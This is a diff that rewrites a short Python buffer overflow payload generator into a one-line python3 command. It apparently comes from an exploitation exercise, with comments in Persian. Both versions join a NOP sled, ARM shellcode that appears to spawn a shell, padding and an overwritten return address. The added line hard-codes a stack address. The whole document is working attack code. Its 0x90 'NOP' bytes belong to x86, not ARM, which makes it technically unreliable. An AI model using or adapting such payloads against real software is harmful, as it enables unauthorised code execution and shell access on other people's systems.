@@ -1,18 +1,1 @@
-import sys
-
-# 1. Shellcode ARM
-ARM_SHELLCODE = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf'
-
-# 2. NOP Sled (برای هدف‌گیری آسان‌تر)
-NOP_SLED = b'\x90' * 32
-
-# 3. Padding (برای رسیدن به 68 بایت)
-PADDING = b'C' * 16 # C's
-
-# 4. Return Address Placeholder (برای Crash)
-NEW_EIP_PLACEHOLDER = b'BBBB' # \x42\x42\x42\x42 
-
-# Payload نهایی
-payload = NOP_SLED + ARM_SHELLCODE + PADDING + NEW_EIP_PLACEHOLDER
-
-sys.stdout.buffer.write(payload)
+python3 -c 'import sys; NOP = b"\x90" * 30; SC = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x30\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf"; PADDING = b"A" * 26; PC = b"\x70\xf2\xff\xbe"; sys.stdout.buffer.write(NOP + SC + PADDING + PC)'
